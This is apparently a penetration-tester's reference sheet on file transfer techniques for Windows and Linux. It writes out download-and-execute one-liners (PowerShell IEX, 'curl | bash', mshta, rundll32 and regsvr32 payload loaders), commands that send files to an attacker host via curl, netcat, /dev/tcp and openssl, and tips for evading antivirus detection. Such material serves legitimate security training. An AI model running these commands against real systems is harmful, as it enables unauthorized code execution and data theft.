# File Transfers

File transfer is a critical skill in penetration testing and system administration. This guide covers various methods and tools for transferring files between systems.

## Table of Contents
- [Windows File Transfer Methods](#windows-file-transfer-methods)
- [Linux File Transfer Methods](#linux-file-transfer-methods)
- [Upload Operations](#upload-operations)
- [Download Operations](#download-operations)
- [Living off the Land](#living-off-the-land)

---

## Windows File Transfer Methods

### PowerShell

#### Download File
```powershell
# Using Invoke-WebRequest
Invoke-WebRequest -Uri "http://10.10.14.1:8000/file.exe" -OutFile "C:\Temp\file.exe"

# Using WebClient
(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.1:8000/file.exe", "C:\Temp\file.exe")

# Short form
iwr -uri http://10.10.14.1:8000/file.exe -Outfile file.exe

# Download and Execute in Memory
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/script.ps1')

# Invoke-WebRequest to download
Invoke-WebRequest http://10.10.14.1/PowerView.ps1 -OutFile PowerView.ps1
```

#### Upload File
```powershell
# Using Invoke-RestMethod
Invoke-RestMethod -Uri http://10.10.14.1:8000/upload -Method Post -InFile C:\Temp\file.txt

# Using Invoke-WebRequest
Invoke-WebRequest -Uri http://10.10.14.1:8000/upload -Method Post -InFile C:\Temp\file.txt
```

### Certutil
```cmd
# Download file
certutil -urlcache -f http://10.10.14.1:8000/file.exe file.exe

# Alternative syntax
certutil.exe -urlcache -split -f "http://10.10.14.1:8000/file.exe" file.exe
```

### BITSAdmin
```cmd
# Download file
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.14.1:8000/file.exe C:\Temp\file.exe
```

### SMB
```cmd
# Copy from SMB share
copy \\10.10.14.1\share\file.exe C:\Temp\file.exe

# Using net use
net use Z: \\10.10.14.1\share
copy Z:\file.exe C:\Temp\file.exe
```

### FTP
```cmd
# Create FTP script
echo open 10.10.14.1 21 > ftp.txt
echo USER username >> ftp.txt
echo password >> ftp.txt
echo bin >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt

# Execute FTP script
ftp -v -n -s:ftp.txt
```

---

## Linux File Transfer Methods

### Wget
```bash
# Basic download
wget http://10.10.14.1:8000/file.sh

# Download with different name
wget http://10.10.14.1:8000/file.sh -O /tmp/script.sh

# Download in background
wget -b http://10.10.14.1:8000/file.sh

# Download with authentication
wget --user=username --password=password http://10.10.14.1:8000/file.sh
```

### cURL
```bash
# Download file
curl http://10.10.14.1:8000/file.sh -o file.sh

# Download and pipe to bash
curl http://10.10.14.1:8000/script.sh | bash

# Download with authentication
curl -u username:password http://10.10.14.1:8000/file.sh -o file.sh

# Upload file via POST
curl -X POST http://10.10.14.1:8000/upload -F "file=@/tmp/file.txt"

# Upload file via PUT
curl -T file.txt http://10.10.14.1:8000/upload
```

### SCP (Secure Copy)
```bash
# Copy from remote to local
scp user@10.10.14.1:/path/to/file.txt /local/path/

# Copy from local to remote
scp /local/file.txt user@10.10.14.1:/remote/path/

# Copy entire directory
scp -r user@10.10.14.1:/path/to/directory /local/path/

# Using specific port
scp -P 2222 user@10.10.14.1:/path/to/file.txt /local/path/
```

### Netcat
```bash
# Receiver (listening machine)
nc -lvnp 4444 > received_file.txt

# Sender
nc 10.10.14.1 4444 < file.txt

# Send entire directory (with tar)
# Receiver
nc -lvnp 4444 | tar xvf -

# Sender
tar cvf - /path/to/directory | nc 10.10.14.1 4444
```

### Base64 Encoding
```bash
# Encode file
base64 file.txt > file.b64

# Decode file
base64 -d file.b64 > file.txt

# One-liner transfer
cat file.txt | base64
# Copy output and on target:
echo "<base64_string>" | base64 -d > file.txt
```

### Python HTTP Server
```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# Specify bind address
python3 -m http.server 8000 --bind 0.0.0.0
```

### Python Upload Server
```python
# uploadserver.py
import http.server
import socketserver

class HTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        with open("uploaded_file", "wb") as f:
            f.write(post_data)
        self.send_response(200)
        self.end_headers()

with socketserver.TCPServer(("", 8000), HTTPRequestHandler) as httpd:
    httpd.serve_forever()
```

### PHP
```bash
# Start PHP server
php -S 0.0.0.0:8000
```

### Ruby
```bash
# Start Ruby server
ruby -run -ehttpd . -p8000
```

---

## Upload Operations

### Python Requests (Upload)
```python
import requests

url = "http://10.10.14.1:8000/upload"
files = {'file': open('data.txt', 'rb')}
r = requests.post(url, files=files)
```

### PowerShell Upload
```powershell
# Upload file using Invoke-RestMethod
$FileContent = Get-Content -Path "C:\Temp\data.txt" -Raw
Invoke-RestMethod -Uri "http://10.10.14.1:8000/upload" -Method Post -Body $FileContent
```

---

## Download Operations

### Using /dev/tcp (Bash)
```bash
# Download file
exec 3<>/dev/tcp/10.10.14.1/8000
echo -e "GET /file.txt HTTP/1.0\r\n\r\n" >&3
cat <&3
```

### SSH
```bash
# Download file
ssh user@10.10.14.1 "cat /path/to/file.txt" > local_file.txt

# Upload file
cat local_file.txt | ssh user@10.10.14.1 "cat > /path/to/remote_file.txt"
```

---

## Living off the Land

### Windows Built-in Tools

#### mshta
```cmd
mshta http://10.10.14.1:8000/payload.hta
```

#### rundll32
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://10.10.14.1:8000/payload.sct")
```

#### regsvr32
```cmd
regsvr32 /s /n /u /i:http://10.10.14.1:8000/payload.sct scrobj.dll
```

### Linux Built-in Tools

#### dd
```bash
# Receiver
nc -lvnp 4444 | dd of=received_file

# Sender
dd if=file.txt | nc 10.10.14.1 4444
```

#### openssl
```bash
# Receiver (create encrypted tunnel)
openssl s_server -quiet -accept 4444 > received_file.txt

# Sender
openssl s_client -quiet -connect 10.10.14.1:4444 < file.txt
```

---

## Bypass Techniques

### Rename Executable Extensions
```bash
# Rename .exe to .txt
mv payload.exe payload.txt

# After transfer, rename back
mv payload.txt payload.exe
```

### Split Large Files
```bash
# Linux - Split file
split -b 10M large_file.bin part_

# Windows - Combine files
copy /b part_* large_file.bin

# Linux - Combine files
cat part_* > large_file.bin
```

### ZIP with Password
```bash
# Create password-protected zip
zip -P password archive.zip file.txt

# Extract
unzip -P password archive.zip
```

---

## Common Web Servers for File Transfer

### Python uploadserver module
```bash
# Install
pip3 install uploadserver

# Run with upload capability
python3 -m uploadserver 8000
```

### PHP Upload Server
```php
<?php
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded successfully!";
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="Upload" />
</form>
```

### SMB Server (Impacket)
```bash
# Start SMB server
impacket-smbserver share $(pwd) -smb2support

# With authentication
impacket-smbserver share $(pwd) -smb2support -username user -password pass

# Windows - Access share
copy \\10.10.14.1\share\file.exe C:\Temp\file.exe
```

---

## Best Practices

1. **Use Encrypted Channels**: Prefer SCP, SFTP, or HTTPS over unencrypted methods
2. **Verify File Integrity**: Use checksums (MD5, SHA256) to verify transfers
   ```bash
   # Generate checksum
   md5sum file.txt
   sha256sum file.txt
   
   # Windows
   certutil -hashfile file.txt MD5
   certutil -hashfile file.txt SHA256
   ```
3. **Clean Up**: Remove transferred files after use
4. **Obfuscation**: Consider encoding or encrypting sensitive files
5. **Avoid Detection**: Use legitimate system tools when possible
6. **Test Transfers**: Verify functionality after transfer

---

## Troubleshooting

### Check Connectivity
```bash
# Test HTTP server
curl -I http://10.10.14.1:8000

# Test port connectivity
nc -zv 10.10.14.1 8000

# Windows
Test-NetConnection -ComputerName 10.10.14.1 -Port 8000
```

### Firewall Rules
```bash
# Linux - Allow port
sudo ufw allow 8000/tcp

# Windows - Allow port
netsh advfirewall firewall add rule name="HTTP Server" dir=in action=allow protocol=TCP localport=8000
```

---

## Notes
- Always ensure you have proper authorization before transferring files
- Be aware of antivirus and EDR solutions that may flag file transfers
- Consider the target environment and choose appropriate transfer methods
- Document all file transfers during engagements
